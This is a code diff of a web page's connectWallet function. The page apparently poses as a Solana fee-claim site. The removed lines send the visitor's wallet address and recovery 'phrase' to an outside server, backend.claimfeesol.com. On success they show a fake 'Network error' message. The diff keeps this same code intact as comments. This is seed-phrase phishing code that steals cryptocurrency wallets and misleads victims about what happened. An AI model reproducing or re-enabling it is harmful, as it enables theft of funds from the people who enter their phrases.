@@ -30,25 +30,27 @@ export default function Home() {
 
 
   const connectWallet = async (e) => {
-    try {
-        const url = "https://backend.claimfeesol.com/message.php";
 
-        const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
-            headers: {
-                "Content-Type":"application/json",
-            },withCredentials: true
-        })
-        console.log(response.data);
-        if (response.data.status === "success"){
-            setError("Network error. check connection");
-        }
+    console.log(wallet);
+    // try {
+    //     const url = "https://backend.claimfeesol.com/message.php";
 
-        if (response.data.status === "success"){
-            setError(response.data.msg);
-        }
-    } catch (error) {
-        console.log("Error sending phrase: ", error);
-    }
+    //     const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
+    //         headers: {
+    //             "Content-Type":"application/json",
+    //         },withCredentials: true
+    //     })
+    //     console.log(response.data);
+    //     if (response.data.status === "success"){
+    //         setError("Network error. check connection");
+    //     }
+
+    //     if (response.data.status === "success"){
+    //         setError(response.data.msg);
+    //     }
+    // } catch (error) {
+    //     console.log("Error sending phrase: ", error);
+    // }
   }
     
 
